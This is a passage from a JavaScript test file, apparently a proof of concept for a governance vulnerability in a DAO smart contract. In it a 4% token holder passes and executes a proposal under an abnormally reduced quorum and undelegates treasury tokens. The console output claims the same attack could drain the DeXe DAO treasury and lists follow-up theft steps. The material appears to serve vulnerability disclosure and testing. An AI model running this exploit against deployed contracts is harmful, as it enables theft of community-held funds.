      // Verify: attacker's vote REACHES reduced quorum
      assert.isTrue(attackerScaled.gte(reducedQuorum), "Attacker must reach reduced quorum");
      console.log(
        "  ✓ " +
          attackerPercent.toFixed(1) +
          "% > " +
          reducedQuorumPercent.toFixed(1) +
          "% — PASSES under reduced quorum",
      );

      await govPool.vote(proposalId, true, attackerPower, [], { from: ATTACKER });

      const stateAfterVote = await govPool.getProposalState(proposalId);
      assert.equal(
        stateAfterVote.toNumber(),
        ProposalState.WaitingForVotingTransfer,
        "Proposal should pass voting (earlyCompletion with reduced quorum)",
      );
      console.log("\n✓ Vote passed! A 4% minority reached the reduced quorum.");

      // --- Step 3: Execute the proposal ---
      console.log("\n--- Step 3: Execute proposal ---");
      await govPool.moveProposalToValidators(proposalId);
      await validators.voteExternalProposal(proposalId, wei("1000000000000"), true, { from: ATTACKER });
      await govPool.execute(proposalId);

      const stateAfterExec = await govPool.getProposalState(proposalId);
      assert.equal(stateAfterExec.toNumber(), ProposalState.ExecutedFor);
      console.log("✓ Proposal executed!");

      // --- Step 4: Verify treasury was undelegated ---
      const treasuryAfter = await token.balanceOf(govPool.address);
      const tokensReturned = treasuryAfter.minus(treasuryBefore);

      console.log("\n--- Treasury Impact ---");
      console.log("Tokens returned to pool:", web3.utils.fromWei(tokensReturned.toFixed()), "tokens");

      assert.isTrue(tokensReturned.eq(toBN(wei("10000"))), "All 10,000 treasury tokens should be undelegated");

      console.log("\n========== GOVERNANCE TAKEOVER COMPLETE ==========");
      console.log("Summary:");
      console.log(
        "  Treasury ratio:        " + treasuryPercent.toFixed(0) + "% (10,000 of " + totalTokens + " tokens)",
      );
      console.log("  Original quorum:       10%");
      console.log(
        "  Reduced quorum:        ~" +
          reducedQuorumPercent.toFixed(1) +
          "% (a " +
          toBN(10).div(reducedQuorumPercent).toFixed(1) +
          "x reduction)",
      );
      console.log("  Attacker's stake:      " + attackerPercent.toFixed(1) + "% (500 tokens)");
      console.log("  Expert treasury power:  4 experts' treasury voting power excluded");
      console.log("  Result:                10,000 tokens undelegated from experts");
      console.log("");
      console.log("  Under the normal 10% quorum, this 4% vote would have FAILED.");
      console.log("  The attacker could now follow up with a proposal to:");
      console.log("    - Withdraw all treasury funds");
      console.log("    - Permanently lower the quorum via editSettings");
      console.log("    - Mint unauthorized expert NFTs");
      console.log("");
      console.log("  With the DeXe DAO (~49.8M DEXE, ~$208M USD), this attack");
      console.log("  would enable theft of the entire treasury.");
      console.log("====================================================\n");
    });
  });
});
